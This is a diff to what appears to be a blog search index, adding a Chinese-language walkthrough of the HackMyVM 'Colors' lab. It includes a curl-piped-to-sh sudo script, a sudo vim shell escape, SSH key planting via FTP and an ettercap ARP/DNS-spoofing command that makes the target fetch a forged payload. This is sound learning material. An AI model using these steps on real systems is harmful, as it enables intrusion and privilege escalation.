@@ -124,7 +124,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -u &#x27;http://192.168.64.77/access.php?FUZZ=rabbit.jpg&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh=12</span><br></pre></td></tr></table></figure>
 
 <p>果然得到了一个参数‘id’，然后看到了图片</p>
-<p><img   src="/Users/lingtian/Library/Application%20Support/typora-user-images/image-20240316200947799.png"  alt="image-20240316200947799"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316200944.png" ></p>
 <p>再看看这时的源码，然后就联想到命令注入，先闭合单引号，在写入命令试试</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240316201116.png" ></p>
 <p>经过一番探索（结合wp），发现可以直接注入php语句，还要配合前面的log.php，因为access.php不会执行，log.php记录了这些并且会执行，例如：</p>
@@ -302,6 +302,89 @@
       <tags>
         <tag>hackmyvm</tag>
         <tag>复盘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hackmyvm Colors复盘</title>
+    <url>/2024/03/20/hackmyvm-Colors%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶场涉及的知识点比较多，思路是大部分学习其他师傅的wp的，写复盘是想记录思路顺便回顾学好每个知识点。</p>
+<h4 id="启动前准备"><a href="#启动前准备" class="headerlink" title="启动前准备"></a>启动前准备</h4><p>由于<strong>网卡配置不同</strong>，我每次都需要开靶机刚开启的时候shift+e进入grub编辑，给一个root的&#x2F;bin&#x2F;bash启动编辑一下&#x2F;etc&#x2F;netwrok&#x2F;interfaces里面的网卡配置，这是前置背景。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320144812.png" ></p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Colors" >https://hackmyvm.eu/machines/machine.php?vm=Colors<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：medium</p>
+<p>ip：192.168.64.92</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到21、22、80端口，并且22端口被过滤了（注意这里要用root扫如果用普通用户扫扫不到22端口信息）</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154203.png" ></p>
+<p>先访问80端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154338.png" ></p>
+<p>只有一张图片，扫目录一无所获，也对图片分析不出什么内容</p>
+<p>看看21号端口</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154455.png" ></p>
+<p>看起来可以用anonymous登陆，登陆一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154607.png" ></p>
+<p>把secret.jpg下载下来，使用stegseek分析一波</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155012.png" ></p>
+<p>搞出来一段字符，在cyberchef分析，是base85</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155123.png" ></p>
+<p>得到一个pink的账号密码，这个时候我的思路是去登陆22端口，但是它的端口filted，后来去看了wp才知道这里有一个端口敲门，ftp那里就给了提示（好神奇的点子）</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.54.39.png" ></p>
+<p>1127，1039，1081分别对应first，second，third敲门顺序，按顺序敲门端口才会打开，类似情况之前做vuln的DC系列的靶机也遇到过。</p>
+<h5 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h5><p>知道了这个思路，我按照常规思路knock三个端口，然而22端口没有按照预期的打开，我试了很多次，还是失败，也不知道原因。第二天为了想实践后面的关卡，想着干脆关了防火墙，所以借助grub登陆root，按照网上给的命令总是失败，更头疼了。然后就想看看knock的配置文件，找到日志文件，一看到enp0s3我就想到要改成enp01，思路就来了。</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2014.56.31.png" ></p>
+<p>于是经过一番搜索，找到&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;knockd.service，把里面的enp0s3改成enp0s1，再启动靶机</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.24.31.png" ></p>
+<p>这次就可以了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320160752.png" ></p>
+<p>虽然这个问题是针对自己的电脑产生的，别人的电脑可能不会出现这样的情况，但是整个过程是自己一点一点摸索到，最后成功解决的时候真的很开心，所以值得记录一下。</p>
+<h4 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h4><p>ok解决了ssh的问题，想用之前拿到的pink账号密码登陆，还是失败</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161201.png" ></p>
+<p>报错说publickey，说明需要密钥文件登陆。搞半天pink的账号密码可以用ftp登陆，对ftp的敏感度还不够，一直没想到，登陆后</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161544.png" ></p>
+<p>pink目录下有.ssh目录，<strong>思路是在里面上传自己kali的id_rsa.pub（命名为authorized_keys)，然后用那个文件为凭证自己kali登陆ssh</strong></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161803.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161819.png" ></p>
+<p>登陆成功</p>
+<h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><p>拿到pink的shell后没能发现什么，接下来的思路是去到&#x2F;var&#x2F;www&#x2F;html上传一个a.php，再在网页端访问a.php，就拿到www-data的shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320212842.png" ></p>
+<p>Sudo -l查看到green有vim可以利用提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u green /usr/bin/vim</span><br></pre></td></tr></table></figure>
+
+<p>再输入’:!&#x2F;bin&#x2F;sh’，成功拿到green的shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320213122.png" ></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">green@color:/var/www/html$ <span class="built_in">cd</span> /home/green</span><br><span class="line"><span class="built_in">cd</span> /home/green</span><br><span class="line">green@color:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">note.txt  test_4_green</span><br><span class="line">green@color:~$ <span class="built_in">cat</span> no</span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">You<span class="string">&#x27;ve been working very well lately Green, so I&#x27;</span>m going to give you one last <span class="built_in">test</span>. If you pass it I<span class="string">&#x27;ll give you the password for purple.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-root</span></span><br><span class="line"><span class="string">green@color:~$ ./test_4_green</span></span><br><span class="line"><span class="string">./test_4_green</span></span><br><span class="line"><span class="string">Guess the number im thinking: 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Nope, sorry</span></span><br><span class="line"><span class="string">green@color:~$</span></span><br></pre></td></tr></table></figure>
+
+<p>到green到家目录下大致可以利用的就是test_4_green，下载到本地，ida打开查看一下</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.48.22.png" ></p>
+<p>注意到有个jnz比较</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.50.38.png" ></p>
+<p>大致就是比较v8和v7，这里用ida修改一下jnz为jz</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320215526.png" ></p>
+<p>保存后再执行，随便输入一个数字也会爆出密码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.57.24.png" ></p>
+<p>接着就登陆purple账户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">purple@color:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> purple on color:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User purple may run the following commands on color:</span><br><span class="line">    (root) NOPASSWD: /attack_dir/ddos.sh</span><br><span class="line">purple@color:~$ <span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</span><br></pre></td></tr></table></figure>
+
+<p>sudo -l发现有个脚本可以用，就是要下载masterddos.hmv下的attack.sh然后交给&#x2F;usr&#x2F;bin&#x2F;sh 执行</p>
+<p><strong>思路是利用dns欺骗，让靶机向自己的kali发送请求，自己的kali伪造一个attack.sh，让靶机访问</strong></p>
+<p>步骤：</p>
+<p>先在修改&#x2F;etc&#x2F;ettercap&#x2F;etter.dns文件，增加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masterddos.hmv A 192.168.64.3</span><br></pre></td></tr></table></figure>
+
+<p>然后开始dns攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /192.168.64.92// /192.168.64.1//</span><br></pre></td></tr></table></figure>
+
+<p>在靶机去ping masterddos.hmv，回复的ip是kali的ip，DNS欺骗执行成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">purple@color:~$ ping masterddos.hmv</span><br><span class="line">ping masterddos.hmv</span><br><span class="line">PING masterddos.hmv (192.168.64.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=1 ttl=64 time=1.49 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=2 ttl=64 time=0.915 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=3 ttl=64 time=0.972 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=4 ttl=64 time=1.08 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=5 ttl=64 time=0.681 ms</span><br></pre></td></tr></table></figure>
+
+<p>接着就sudo &#x2F;attack_dir&#x2F;ddos.sh执行脚本</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320222448.png" ></p>
+<p>成功拿到root的shell，提权成功。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一次遇到<strong>DNS欺骗</strong>，学到了，通过ftp敲门那里思路比较清奇，要打破惯性思维，不要一看到账号密码只想到ssh的网页，还有ftp！可执行文件修改（二进制方向的魅力），knock开端口（注意网卡配置）。</p>
+<p>这么理下来知识点也不是特别多，但我就要消化好久，自己做的时候没办法想到的思路无非就是因为知识面不够广，还有就是脑子不够灵活（比如没想到拿账号密码登陆ftp），路漫漫。</p>
+]]></content>
+      <tags>
+        <tag>hackmyvm</tag>
+        <tag>复盘学习</tag>
       </tags>
   </entry>
 </search>
